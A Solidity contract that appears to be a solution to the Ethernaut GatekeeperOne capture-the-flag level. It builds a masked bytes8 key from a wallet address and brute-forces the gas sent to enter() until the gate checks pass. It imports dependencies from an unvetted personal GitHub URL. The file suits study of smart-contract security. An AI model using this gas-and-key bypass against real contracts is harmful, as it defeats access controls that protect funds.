// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'https://github.com/ssadad112/eth13_1.sol/blob/main/eth1313.sol';

contract AreYouTheKeymaster{
    using SafeMath for uint256;
    bytes8 txOrigin16 = 0xA4c02754963E3a2e; //你钱包地址的后16位
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;
    GatekeeperOne public gkpOne;

    function setGatekepperOne(address _addr) public{
        gkpOne = GatekeeperOne(_addr);
    }

    function letMeIn() public{
        for (uint256 i =0; i < 120; i++) {
            (bool result, bytes memory data) = address(gkpOne).call{gas:
            i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key)); 
            if(result)
            {
                break;
            } 
        }
    }
}
